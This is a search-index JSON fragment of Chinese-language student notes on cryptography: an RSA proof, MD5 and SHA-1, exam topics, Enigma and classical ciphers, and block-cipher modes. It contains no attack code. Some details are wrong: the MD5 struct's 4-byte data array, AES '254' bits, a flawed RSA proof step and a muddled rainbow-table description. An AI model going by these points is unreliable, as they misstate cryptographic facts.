m*(m^{(p-1)(q-1)})^k {\\rm\\ mod}\\ N\\\\ \\end{aligned} \\]","title":"Step1 \u516c\u5f0f\u5316\u7b80"},{"location":"course/crypto/RSA/#step2","text":"\uff081\uff09\u82e5 \\(\\gcd(m,N)=1\\) \uff0c\u5219 \\(m^{\\phi(N)}\\equiv 1\\mod N\\) \\[ \\begin{aligned} &\\because gcb(p,q)=1,\\phi(p)=p-1,\\phi(q)=q-1\\\\ &\\therefore \\phi(pq)=\\phi(p)\\phi(q)=(p-1)(q-1)\\\\ &\\therefore m^{(p-1)(q-1)}=m^{\\phi(pq)}=m^{\\phi(N)} \\equiv 1\\mod N\\\\ &\\therefore m*(m^{(p-1)(q-1)})^k \\equiv m\\mod\\ N \\end{aligned} \\] \uff082\uff09\u82e5 \\(\\gcd(m,N)\\ne 1\\) \\[ \\begin{aligned} &\\because m<N, \\gcd(m,N)\\ne1\\\\ &\u5047\u8bbe gcd(m,M)=p\\ (m = cp), \u5219 m \\equiv 1 \\mod q\\\\ & \\therefore m^{k(p-1)(q-1)} \\equiv (m^{q-1})^{k(p-1)} \\equiv 1\\mod q\\\\ &\u4ee4 m^{k(p-1)(q-1)}=sq+1\\\\ & \\therefore m*m^{k(p-1)(q-1)} = m * (s*q + 1) = c*s*p*q + m =c*s*N+m\\equiv m \\mod N\\\\ \\end{aligned} \\] QED","title":"Step2 \u5206\u7c7b\u8ba8\u8bba\u8bc1\u660e"},{"location":"course/crypto/SHA1/","text":"SHA-1 SHA-1\u662f\u5c06\u660e\u6587\u5904\u7406\u621020byte\u7684\u54c8\u5e0c\u6458\u8981(\u6bd4MD5\u591a\u4e864byte) SHA-1\u4f7f\u7528\u5206\u5757\u8ba1\u7b97\uff0c\u6bcf\u5757\u7684\u957f\u5ea6\u4e3a64byte\uff0c\u586b\u5145\u65b9\u5f0f\u4e5f\u548cMD5\u76f8\u540c\u3002","title":"SHA-1"},{"location":"course/crypto/SHA1/#sha-1","text":"SHA-1\u662f\u5c06\u660e\u6587\u5904\u7406\u621020byte\u7684\u54c8\u5e0c\u6458\u8981(\u6bd4MD5\u591a\u4e864byte) SHA-1\u4f7f\u7528\u5206\u5757\u8ba1\u7b97\uff0c\u6bcf\u5757\u7684\u957f\u5ea6\u4e3a64byte\uff0c\u586b\u5145\u65b9\u5f0f\u4e5f\u548cMD5\u76f8\u540c\u3002","title":"SHA-1"},{"location":"course/crypto/final/","text":"Crypto \u8003\u8bd5\u91cd\u70b9 \u9898\u578b \u5355\u9009\u9898(20',10 \u9053) \u7b80\u7b54\u9898(20',4-5\u9053) \u7b80\u5355\u63cf\u8ff0\u67d0\u4e2a\u7b97\u6cd5\u3001\u7b97\u6cd5\u7247\u6bb5\u7684\u539f\u7406 \u7528\u7a0b\u5e8f\u5b9e\u73b0\u67d0\u4e2a\u7b97\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206 \u7b80\u5355\u7684\u8ba1\u7b97 \u8ba1\u7b97\u9898(40') \u590d\u6742\u7684\u8ba1\u7b97\u516c\u5f0f\u4f1a\u5728\u8bd5\u5377\u4e0a\u7ed9\u51fa \u8bc1\u660e\u9898(20',\u56db\u9009\u4e8c) RSA \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 gcd(x,y)=nx+uy Euler\u51c6\u5219 \u8003\u5bdf\u91cd\u70b9 enigma: \u4e86\u89e3\u52a0\u5bc6\u89e3\u5bc6\u8fc7\u7a0b(\u8003\u7b80\u7b54\u9898)\uff0c\u77e5\u9053\u5168\u8fc7\u7a0b md5, sha: \u590d\u6742\u7684\u79fb\u4f4d\u4e0d\u8003\uff0c\u8003\u5bdf\u70b9\u5728\u4e8e\u5757\u8ba1\u7b97\uff08\u53d6\u591a\u957f\u7684\u5b57\u8282\uff0c\u7ed3\u679c\u591a\u5c11\u5b57\u8282\uff09\uff0c\u4f4d\u8865\u5145 rc4, ecb, cbc, cfb rc4\u4e86\u89e3\u57fa\u672c\u539f\u7406 ecb\u52a0\u5bc6\u8fc7\u7a0b\u3001\u4f18\u70b9\u7f3a\u70b9 cbc\u52a0\u5bc6\u8fc7\u7a0b cfb\u52a0\u5bc6\u8fc7\u7a0b\uff08\u9700\u8981\u4e86\u89e3\u8be6\u7ec6\u8fc7\u7a0b\uff09 des \u52a0\u5bc6\u6d41\u7a0b sbox\u67e5\u8be2\u8fc7\u7a0b aes \u8003\u5bdf\u91cd\u70b9mixcolumn \u5982\u4f55\u505a\u4e24\u4e2a\u516b\u4f4d\u7684\u4e58\u6cd5\uff1f\uff08\u519c\u592b\u7b97\u6cd5\uff09 \u77e9\u9635\u7684\u8ba1\u7b97\uff1f \u4e09\u79cd\u52a0\u5bc6\u89c4\u6a21\uff1a\u5bc6\u94a5\u751f\u6210\u8fc7\u7a0b 128->10\u8f6e 192->12\u8f6e 254->14\u8f6e rsa rsa\u8bc1\u660e \u52a0\u5bc6\u8fc7\u7a0b rsa\u6e90\u4ee3\u7801(openssl\u7528\u6cd5) ecc \u70b9\u52a0\u6cd5\u3001\u70b9\u4e58\u6cd5\uff08\u5faa\u73af\u5b50\u7fa4\uff09 \u4e00\u79cd\u52a0\u89e3\u5bc6\u7b97\u6cd5\u3001\u4e24\u79cd\u7b7e\u540d\u7b97\u6cd5 ecc\u6e90\u4ee3\u7801 \u77e5\u9053openssl\u51fd\u6570\u7684\u7528\u9014\u3001\u53c2\u6570\u7684\u542b\u4e49 RSA \u4e58\u65b9\u3001\u6c42\u6a21 ECC \u70b9\u7684\u8bbe\u7f6e ...","title":"Crypto \u8003\u8bd5\u91cd\u70b9"},{"location":"course/crypto/final/#crypto","text":"","title":"Crypto \u8003\u8bd5\u91cd\u70b9"},{"location":"course/crypto/final/#_1","text":"\u5355\u9009\u9898(20',10 \u9053) \u7b80\u7b54\u9898(20',4-5\u9053) \u7b80\u5355\u63cf\u8ff0\u67d0\u4e2a\u7b97\u6cd5\u3001\u7b97\u6cd5\u7247\u6bb5\u7684\u539f\u7406 \u7528\u7a0b\u5e8f\u5b9e\u73b0\u67d0\u4e2a\u7b97\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206 \u7b80\u5355\u7684\u8ba1\u7b97 \u8ba1\u7b97\u9898(40') \u590d\u6742\u7684\u8ba1\u7b97\u516c\u5f0f\u4f1a\u5728\u8bd5\u5377\u4e0a\u7ed9\u51fa \u8bc1\u660e\u9898(20',\u56db\u9009\u4e8c) RSA \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 gcd(x,y)=nx+uy Euler\u51c6\u5219","title":"\u9898\u578b"},{"location":"course/crypto/final/#_2","text":"enigma: \u4e86\u89e3\u52a0\u5bc6\u89e3\u5bc6\u8fc7\u7a0b(\u8003\u7b80\u7b54\u9898)\uff0c\u77e5\u9053\u5168\u8fc7\u7a0b md5, sha: \u590d\u6742\u7684\u79fb\u4f4d\u4e0d\u8003\uff0c\u8003\u5bdf\u70b9\u5728\u4e8e\u5757\u8ba1\u7b97\uff08\u53d6\u591a\u957f\u7684\u5b57\u8282\uff0c\u7ed3\u679c\u591a\u5c11\u5b57\u8282\uff09\uff0c\u4f4d\u8865\u5145 rc4, ecb, cbc, cfb rc4\u4e86\u89e3\u57fa\u672c\u539f\u7406 ecb\u52a0\u5bc6\u8fc7\u7a0b\u3001\u4f18\u70b9\u7f3a\u70b9 cbc\u52a0\u5bc6\u8fc7\u7a0b cfb\u52a0\u5bc6\u8fc7\u7a0b\uff08\u9700\u8981\u4e86\u89e3\u8be6\u7ec6\u8fc7\u7a0b\uff09 des \u52a0\u5bc6\u6d41\u7a0b sbox\u67e5\u8be2\u8fc7\u7a0b aes \u8003\u5bdf\u91cd\u70b9mixcolumn \u5982\u4f55\u505a\u4e24\u4e2a\u516b\u4f4d\u7684\u4e58\u6cd5\uff1f\uff08\u519c\u592b\u7b97\u6cd5\uff09 \u77e9\u9635\u7684\u8ba1\u7b97\uff1f \u4e09\u79cd\u52a0\u5bc6\u89c4\u6a21\uff1a\u5bc6\u94a5\u751f\u6210\u8fc7\u7a0b 128->10\u8f6e 192->12\u8f6e 254->14\u8f6e rsa rsa\u8bc1\u660e \u52a0\u5bc6\u8fc7\u7a0b rsa\u6e90\u4ee3\u7801(openssl\u7528\u6cd5) ecc \u70b9\u52a0\u6cd5\u3001\u70b9\u4e58\u6cd5\uff08\u5faa\u73af\u5b50\u7fa4\uff09 \u4e00\u79cd\u52a0\u89e3\u5bc6\u7b97\u6cd5\u3001\u4e24\u79cd\u7b7e\u540d\u7b97\u6cd5 ecc\u6e90\u4ee3\u7801 \u77e5\u9053openssl\u51fd\u6570\u7684\u7528\u9014\u3001\u53c2\u6570\u7684\u542b\u4e49 RSA \u4e58\u65b9\u3001\u6c42\u6a21 ECC \u70b9\u7684\u8bbe\u7f6e ...","title":"\u8003\u5bdf\u91cd\u70b9"},{"location":"course/crypto/md5/","text":"MD5 MD5\u662f\u5c06\u660e\u6587\u5904\u7406\u621016byte\u7684\u54c8\u5e0c\u6458\u8981 \u7528\u9014 md5\u5e38\u4e0e\u5176\u4ed6\u7b97\u6cd5\u7ed3\u5408\uff0c\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\uff0c\u5982\u90ae\u4ef6\u53d1\u9001 \u52a0\u5bc6\u8fc7\u7a0b \\[ \\begin{aligned} \\rm m&={\\rm md5}(letter)\\\\ \\rm m'&={\\rm rsa}(m,\\rm private\\ key) \\end{aligned} \\] \u68c0\u9a8c\u8fc7\u7a0b \\[ \\begin{aligned} \\rm md5(letter) == \\rm rsa(m', public\\ key)\\\\ \\end{aligned} \\] \u5b9e\u73b0 \u7ed3\u6784\u4f53\u5b9a\u4e49 typedef struct _MD5_CTX { unsigned long state [ 4 ]; unsigned long count [ 2 ]; /* \u5df2\u5904\u7406\u7684\u62a5\u6587\u7684\u4e8c\u8fdb\u5236\u4f4d\u6570,\u6700\u5927\u503c=2^64-1 */ unsigned char data [ 4 ]; /* 64\u5b57\u8282message\u5757 */ } Init \u5bf9state\u8d4b\u521d\u59cb\u503c\uff0c\u6e05\u7a7acount Update \u6bcf64\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\uff0c\u8fdb\u884c\u5904\u7406\u66f4\u65b0 Final \u56e0\u4e3a\u4e0d\u662f\u6240\u6709\u7684\u660e\u6587\u90fd\u662f64\u5b57\u8282\u7684\u500d\u6570\uff0c\u6240\u4ee5\u9700\u8981\u5bf9\u7f3a\u5931\u7684\u5185\u5bb9\u8fdb\u884c\u8865\u5145\uff0c\u8865\u5145\u7684\u5185\u5bb9\u5305\u62ec \u586b\u5145\u7269 \u548c \u660e\u6587\u957f\u5ea6 \u586b\u5145\u7269 0x80, 0x00, 0x00, ..., 0x00 \u89c4\u5219 \u7834\u89e3 MD5\u7684\u7834\u89e3\u5173\u952e\u5728\u4e8e\u627e\u5230Collision Collision \\({\\rm md5}(x)={\\rm md5}(x') \\ \\ (x\\ne x')\\) rainbow table \u4e00\u79cd\u8f83\u5f31\u7684MD5\u7834\u89e3\u65b9\u6cd5\uff0c\u5173\u952e\u5728\u4e8e \u9884\u8ba1\u7b97 \u627eN\u7ec4\u6570\u636e \u5bf9N\u7ec4\u6570\u636e\u5206\u522b\u4f7f\u7528MD5\u5904\u7406K\u8f6e \u5bf9\u76ee\u6807\u6570X\u8fdb\u884cMD5\u5904\u7406\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0eN\u4e2a(\u5904\u7406K\u8f6e\u540e\u7684)\u7ed3\u679c\u8fdb\u884c\u6bd4\u8f83 \u82e5X\u4e0e\u5176\u4e2d\u67d0\u4e2a\u6570\u76f8\u7b49\uff0c\u5219\u6839\u636eX\u88abMD5\u5904\u7406\u7684\u8f6e\u6570\u5373\u53ef\u5012\u63a8\u51faCollision \u5426\u5219\u7ee7\u7eed\u5bf9X\u8fdb\u884cMD5\u5904\u7406","title":"MD5"},{"location":"course/crypto/md5/#md5","text":"MD5\u662f\u5c06\u660e\u6587\u5904\u7406\u621016byte\u7684\u54c8\u5e0c\u6458\u8981","title":"MD5"},{"location":"course/crypto/md5/#_1","text":"md5\u5e38\u4e0e\u5176\u4ed6\u7b97\u6cd5\u7ed3\u5408\uff0c\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\uff0c\u5982\u90ae\u4ef6\u53d1\u9001","title":"\u7528\u9014"},{"location":"course/crypto/md5/#_2","text":"\\[ \\begin{aligned} \\rm m&={\\rm md5}(letter)\\\\ \\rm m'&={\\rm rsa}(m,\\rm private\\ key) \\end{aligned} \\]","title":"\u52a0\u5bc6\u8fc7\u7a0b"},{"location":"course/crypto/md5/#_3","text":"\\[ \\begin{aligned} \\rm md5(letter) == \\rm rsa(m', public\\ key)\\\\ \\end{aligned} \\]","title":"\u68c0\u9a8c\u8fc7\u7a0b"},{"location":"course/crypto/md5/#_4","text":"","title":"\u5b9e\u73b0"},{"location":"course/crypto/md5/#_5","text":"typedef struct _MD5_CTX { unsigned long state [ 4 ]; unsigned long count [ 2 ]; /* \u5df2\u5904\u7406\u7684\u62a5\u6587\u7684\u4e8c\u8fdb\u5236\u4f4d\u6570,\u6700\u5927\u503c=2^64-1 */ unsigned char data [ 4 ]; /* 64\u5b57\u8282message\u5757 */ }","title":"\u7ed3\u6784\u4f53\u5b9a\u4e49"},{"location":"course/crypto/md5/#init","text":"\u5bf9state\u8d4b\u521d\u59cb\u503c\uff0c\u6e05\u7a7acount","title":"Init"},{"location":"course/crypto/md5/#update","text":"\u6bcf64\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\uff0c\u8fdb\u884c\u5904\u7406\u66f4\u65b0","title":"Update"},{"location":"course/crypto/md5/#final","text":"\u56e0\u4e3a\u4e0d\u662f\u6240\u6709\u7684\u660e\u6587\u90fd\u662f64\u5b57\u8282\u7684\u500d\u6570\uff0c\u6240\u4ee5\u9700\u8981\u5bf9\u7f3a\u5931\u7684\u5185\u5bb9\u8fdb\u884c\u8865\u5145\uff0c\u8865\u5145\u7684\u5185\u5bb9\u5305\u62ec \u586b\u5145\u7269 \u548c \u660e\u6587\u957f\u5ea6 \u586b\u5145\u7269 0x80, 0x00, 0x00, ..., 0x00 \u89c4\u5219","title":"Final"},{"location":"course/crypto/md5/#_6","text":"MD5\u7684\u7834\u89e3\u5173\u952e\u5728\u4e8e\u627e\u5230Collision","title":"\u7834\u89e3"},{"location":"course/crypto/md5/#collision","text":"\\({\\rm md5}(x)={\\rm md5}(x') \\ \\ (x\\ne x')\\)","title":"Collision"},{"location":"course/crypto/md5/#rainbow-table","text":"\u4e00\u79cd\u8f83\u5f31\u7684MD5\u7834\u89e3\u65b9\u6cd5\uff0c\u5173\u952e\u5728\u4e8e \u9884\u8ba1\u7b97 \u627eN\u7ec4\u6570\u636e \u5bf9N\u7ec4\u6570\u636e\u5206\u522b\u4f7f\u7528MD5\u5904\u7406K\u8f6e \u5bf9\u76ee\u6807\u6570X\u8fdb\u884cMD5\u5904\u7406\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0eN\u4e2a(\u5904\u7406K\u8f6e\u540e\u7684)\u7ed3\u679c\u8fdb\u884c\u6bd4\u8f83 \u82e5X\u4e0e\u5176\u4e2d\u67d0\u4e2a\u6570\u76f8\u7b49\uff0c\u5219\u6839\u636eX\u88abMD5\u5904\u7406\u7684\u8f6e\u6570\u5373\u53ef\u5012\u63a8\u51faCollision \u5426\u5219\u7ee7\u7eed\u5bf9X\u8fdb\u884cMD5\u5904\u7406","title":"rainbow table"},{"location":"course/crypto/old/","text":"\u53e4\u5178\u5bc6\u7801 Info 2022/6/14 \u4fee\u6539Enigma\u52a0\u5bc6\u6d41\u7a0b\u56fe 2022/6/14 \u6dfb\u52a0double stepping\u793a\u610f\u56fe \u5355\u8868\u5bc6\u7801 \u4f7f\u7528\u660e\u6587\u5bc6\u6587\u5bf9\u7167\u8868 \u4eff\u5c04\u5bc6\u7801 \\(x = (y \\times k_1+k_2 )\\%n\\) \\(y = (x-k_2)\\times k^{-1} \\%n\\) \u591a\u8868\u5bc6\u7801 \u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u91c7\u7528\u4e0d\u540c\u7684\u5355\u8868\u66ff\u6362\uff08\u540c\u4e00\u660e\u6587\u5b57\u6bcd\u5bf9\u5e94\u591a\u4e2a\u5bc6\u6587\u5b57\u7b26\uff09 Vigenere Algorithm \u660e\u6587: this cryptto system is not secure \u5bc6\u94a5: cipher cipher cipher cipher cipher \u5bc6\u6587: VPXZGIA... t+c = v t+p = i Enigma Date: \u6bcf\u4e00\u5929\u7684\u5bc6\u7801\u8bbe\u8ba1 Ringstellung (delta)\u6dfb\u52a0\u589e\u91cf Steckerverbindungen: \u5341\u5bf9\u5b57\u6bcd\u7684\u76f8\u4e92\u8f6c\u5316 Kenngrunppen: \u548c\u65e5\u671f\u5bf9\u5e94 \u65b9\u4fbf\u60c5\u62a5\u5f52\u7c7b \u90e8\u4ef6\u4e0e\u6982\u5ff5 rotor1\uff0c\u5b57\u6bcd\u88681 rotor2\uff0c\u5b57\u6bcd\u88682 rotor3\uff0c\u5b57\u6bcd\u88683 reflactor\uff0c\u5b57\u6bcd\u4e24\u4e24\u5bf9\u5e94 wiring board\uff0c\u8fde\u63a5\u5bf9\u5e94\u5b57\u6bcd message key\uff0c\u4e09\u4e2arotor \u5916\u9762 \u7684\u663e\u793a\uff0c\u5916\u90e8delta ring setting\uff0c\u4e09\u4e2arotor \u5185\u90e8 \u7684\u8bbe\u7f6e\uff0c\u5185\u90e8delta delta = message key - ring setting \u5177\u4f53\u52a0\u5bc6\u6d41\u7a0b plaintext -> wiring board -> +delta1 -> rotor1 -> -delta1 -> +delta2 -> rotor2 -> -delta2 -> +delta3 -> rotor3 -> -delta3 -> reflactor -> +delta3 -> rotor3 -> -delta3 -> +delta2 -> rotor2 -> -delta2 -> +delta1 -> rotor3 -> -delta1 -> wiring board -> cripertext \u540c\u7406\u53ef\u77e5\u52a0\u5bc6\u3001\u89e3\u5bc6\u662f\u5b8c\u5168\u53ef\u9006\u7684\u8fc7\u7a0b \u9f7f\u8f6e\u8df3\u8f6c\u89c4\u5219 QEVJZ RFWKA \u5e38\u89c4\u8df3\u8f6c \u6bcf\u6309\u4e00\u4e0b\uff0c\u9f7f\u8f6eI\u8df3\u8f6c\u4e00\u4e0b \u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c\u4e00\u4e0b double stepping \u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c \u82e5\u6b64\u65f6\u9f7f\u8f6e\u2161\u662f\u4eceD\u8df3\u8f6c\u5230E\uff0c\u5219\u4e0b\u4e00\u6b21\u9f7f\u8f6e\u2161\u4eceE\u8df3\u8f6c\u5230F\uff0c\u5e76\u5e26\u52a8\u9f7f\u8f6e\u2162\u8df3\u8f6c \u53ef\u4ee5\u7406\u89e3\u4e3a I=Q,\u2161=D,\u2162=X -> I=R,\u2161=E,\u2162=X -> I=S,\u2161=F,\u2162=X+1","title":"\u53e4\u5178\u5bc6\u7801"},{"location":"course/crypto/old/#_1","text":"Info 2022/6/14 \u4fee\u6539Enigma\u52a0\u5bc6\u6d41\u7a0b\u56fe 2022/6/14 \u6dfb\u52a0double stepping\u793a\u610f\u56fe","title":"\u53e4\u5178\u5bc6\u7801"},{"location":"course/crypto/old/#_2","text":"\u4f7f\u7528\u660e\u6587\u5bc6\u6587\u5bf9\u7167\u8868","title":"\u5355\u8868\u5bc6\u7801"},{"location":"course/crypto/old/#_3","text":"\\(x = (y \\times k_1+k_2 )\\%n\\) \\(y = (x-k_2)\\times k^{-1} \\%n\\)","title":"\u4eff\u5c04\u5bc6\u7801"},{"location":"course/crypto/old/#_4","text":"\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u91c7\u7528\u4e0d\u540c\u7684\u5355\u8868\u66ff\u6362\uff08\u540c\u4e00\u660e\u6587\u5b57\u6bcd\u5bf9\u5e94\u591a\u4e2a\u5bc6\u6587\u5b57\u7b26\uff09","title":"\u591a\u8868\u5bc6\u7801"},{"location":"course/crypto/old/#vigenere-algorithm","text":"\u660e\u6587: this cryptto system is not secure \u5bc6\u94a5: cipher cipher cipher cipher cipher \u5bc6\u6587: VPXZGIA... t+c = v t+p = i","title":"Vigenere Algorithm"},{"location":"course/crypto/old/#enigma","text":"Date: \u6bcf\u4e00\u5929\u7684\u5bc6\u7801\u8bbe\u8ba1 Ringstellung (delta)\u6dfb\u52a0\u589e\u91cf Steckerverbindungen: \u5341\u5bf9\u5b57\u6bcd\u7684\u76f8\u4e92\u8f6c\u5316 Kenngrunppen: \u548c\u65e5\u671f\u5bf9\u5e94 \u65b9\u4fbf\u60c5\u62a5\u5f52\u7c7b","title":"Enigma"},{"location":"course/crypto/old/#_5","text":"rotor1\uff0c\u5b57\u6bcd\u88681 rotor2\uff0c\u5b57\u6bcd\u88682 rotor3\uff0c\u5b57\u6bcd\u88683 reflactor\uff0c\u5b57\u6bcd\u4e24\u4e24\u5bf9\u5e94 wiring board\uff0c\u8fde\u63a5\u5bf9\u5e94\u5b57\u6bcd message key\uff0c\u4e09\u4e2arotor \u5916\u9762 \u7684\u663e\u793a\uff0c\u5916\u90e8delta ring setting\uff0c\u4e09\u4e2arotor \u5185\u90e8 \u7684\u8bbe\u7f6e\uff0c\u5185\u90e8delta delta = message key - ring setting","title":"\u90e8\u4ef6\u4e0e\u6982\u5ff5"},{"location":"course/crypto/old/#_6","text":"plaintext -> wiring board -> +delta1 -> rotor1 -> -delta1 -> +delta2 -> rotor2 -> -delta2 -> +delta3 -> rotor3 -> -delta3 -> reflactor -> +delta3 -> rotor3 -> -delta3 -> +delta2 -> rotor2 -> -delta2 -> +delta1 -> rotor3 -> -delta1 -> wiring board -> cripertext \u540c\u7406\u53ef\u77e5\u52a0\u5bc6\u3001\u89e3\u5bc6\u662f\u5b8c\u5168\u53ef\u9006\u7684\u8fc7\u7a0b","title":"\u5177\u4f53\u52a0\u5bc6\u6d41\u7a0b"},{"location":"course/crypto/old/#_7","text":"QEVJZ RFWKA \u5e38\u89c4\u8df3\u8f6c \u6bcf\u6309\u4e00\u4e0b\uff0c\u9f7f\u8f6eI\u8df3\u8f6c\u4e00\u4e0b \u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c\u4e00\u4e0b double stepping \u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c \u82e5\u6b64\u65f6\u9f7f\u8f6e\u2161\u662f\u4eceD\u8df3\u8f6c\u5230E\uff0c\u5219\u4e0b\u4e00\u6b21\u9f7f\u8f6e\u2161\u4eceE\u8df3\u8f6c\u5230F\uff0c\u5e76\u5e26\u52a8\u9f7f\u8f6e\u2162\u8df3\u8f6c \u53ef\u4ee5\u7406\u89e3\u4e3a I=Q,\u2161=D,\u2162=X -> I=R,\u2161=E,\u2162=X -> I=S,\u2161=F,\u2162=X+1","title":"\u9f7f\u8f6e\u8df3\u8f6c\u89c4\u5219"},{"location":"course/crypto/rc4/","text":"\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\u4e0e\u6d41\u5bc6\u7801 1. \u7535\u5b50\u5bc6\u7801\u7c3f\u6a21\u5f0f ECB Electronic codebook mode\uff0c\u5c06\u660e\u6587\u62c6\u5206\u6210\u82e5\u5e72\u6bb5\uff0c\u5206\u522b\u52a0\u5bc6\u3002 ECB\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff1a \\(C_j = E_k(P_j)\\) ECB\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff1a \\(P_j = D_k(C_j)\\) ECB\u7684\u7f3a\u70b9\uff1a\u540c\u6837\u5185\u5bb9\u7684\u660e\u6587\u6bb5\uff0c\u52a0\u5bc6\u7ed3\u679c\u603b\u662f\u76f8\u540c\uff0c\u5bb9\u6613\u88ab\u653b\u7834 ECB\u7684\u4f18\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u8fc7\u7a0b\u5747\u53ef\u5e76\u884c 2. \u5bc6\u6587\u5757\u94fe\u63a5\u6a21\u5f0f CBC Cipher Block Chaining Mode\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u5982\u4e0b\uff0c\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f9d\u8d56\u4e0a\u4e00\u6b21\u7684\u5bc6\u6587\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002 CBC\u7f3a\u70b9\uff1a\u52a0\u5bc6\u8fc7\u7a0b\u53ea\u80fd\u4e32\u884c CBC\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u4e14\u89e3\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u5e76\u884c 3. \u5bc6\u6587\u53cd\u9988\u6a21\u5f0f CFB Cipher feedback mode \u53ef\u4ee5\u8bbe\u7f6e\u4f4d\u79fb\u6b65\u957f\uff08\u5f53\u6b65\u957f\u4e3a\u4e00\u7ec4\u7684\u957f\u5ea6\u65f6\uff0c\u7b97\u6cd5\u7ea6\u7b49\u4e8eCBC\uff09\uff0c\u7ec4\u4e0e\u7ec4\u4e4b\u95f4\u7406\u8bba\u4e0a\u5b58\u5728\u76f8\u4e92\u5370\u8bc1\u5173\u7cfb\uff0c\u4f7f\u5f97\u5176\u5728\u5bc6\u6587\u4f20\u8f93\u4e2d\u82e5\u4ea7\u751f\u9519\u8bef\uff0c\u4e5f\u53ea\u4f1a\u5f71\u54cd\u90e8\u5206\u6570\u636e\u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0cECB\u7684\u52a0\u5bc6\u5757\u5927\u5c0f\u4e3a8byte\uff0c\u800cCFB\u91c7\u75281byte\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5176\u4e2dP\u4e3a\u660e\u6587(P1,P2...Pn)\uff0cC\u4e3a\u5bc6\u6587\uff0cEk\u4e3a\u4ee5k\u4e3a\u5bc6\u94a5\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0cX1\u4e3a\u521d\u59cb CFB\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u53ef\u4ee5\u4ece\u4f20\u8f93\u7684\u5bc6\u6587\u9519\u8bef\u4e2d\u6062\u590d\u3002 4. \u6d41\u5bc6\u7801\u7b97\u6cd5 RC4","title":"\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\u4e0e\u6d41\u5bc6\u7801"},{"location":"course/crypto/rc4/#_1","text":"","title":"\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\u4e0e\u6d41\u5bc6\u7801"},{"location":"course/crypto/rc4/#1-ecb","text":"Electronic codebook mode\uff0c\u5c06\u660e\u6587\u62c6\u5206\u6210\u82e5\u5e72\u6bb5\uff0c\u5206\u522b\u52a0\u5bc6\u3002 ECB\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff1a \\(C_j = E_k(P_j)\\) ECB\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff1a \\(P_j = D_k(C_j)\\) ECB\u7684\u7f3a\u70b9\uff1a\u540c\u6837\u5185\u5bb9\u7684\u660e\u6587\u6bb5\uff0c\u52a0\u5bc6\u7ed3\u679c\u603b\u662f\u76f8\u540c\uff0c\u5bb9\u6613\u88ab\u653b\u7834 ECB\u7684\u4f18\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u8fc7\u7a0b\u5747\u53ef\u5e76\u884c","title":"1. \u7535\u5b50\u5bc6\u7801\u7c3f\u6a21\u5f0f ECB"},{"location":"course/crypto/rc4/#2-cbc","text":"Cipher Block Chaining Mode\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u5982\u4e0b\uff0c\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f9d\u8d56\u4e0a\u4e00\u6b21\u7684\u5bc6\u6587\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002 CBC\u7f3a\u70b9\uff1a\u52a0\u5bc6\u8fc7\u7a0b\u53ea\u80fd\u4e32\u884c CBC\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u4e14\u89e3\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u5e76\u884c","title":"2. \u5bc6\u6587\u5757\u94fe\u63a5\u6a21\u5f0f CBC"},{"location":"course/crypto/rc4/#3-cfb","text":"Cipher feedback mode 